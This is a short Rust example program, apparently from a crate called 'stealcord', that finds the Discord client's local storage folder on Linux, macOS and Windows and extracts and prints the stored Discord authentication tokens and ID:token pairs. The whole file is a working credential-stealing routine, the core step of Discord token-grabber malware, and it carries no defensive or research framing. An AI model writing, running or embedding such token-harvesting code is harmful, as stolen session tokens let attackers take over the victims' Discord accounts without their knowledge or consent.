// Import necessary libraries
use simple_home_dir::*;
use stealcord::{get_token, get_tokens};

#[cfg(target_os = "linux")]
const DISCORD_PATH: &'static str = ".config/discord/Local Storage/leveldb/";
#[cfg(target_os = "macos")]
const DISCORD_PATH: &'static str = "Library/Application Support/discord/";
#[cfg(target_os = "windows")]
const DISCORD_PATH: &'static str = "AppData\\Roaming\\Discord\\Local Storage\\leveldb";

fn main() {
    // Set path to Discord token storage
    let path = home_dir().unwrap().join(DISCORD_PATH);

    // Get only token
    if let Ok(token) = get_token(path.clone()) {
        // Print token
        println!("{token}")
    } else {
        // Print error message
        panic!("Error getting token")
    }

    // Get ID : Token
    if let Ok(tokens) = get_tokens(path.clone()) {
        // Print tokens
        println!("{tokens}")
    } else {
        // Print error message
        panic!("Error getting tokens")
    }
}
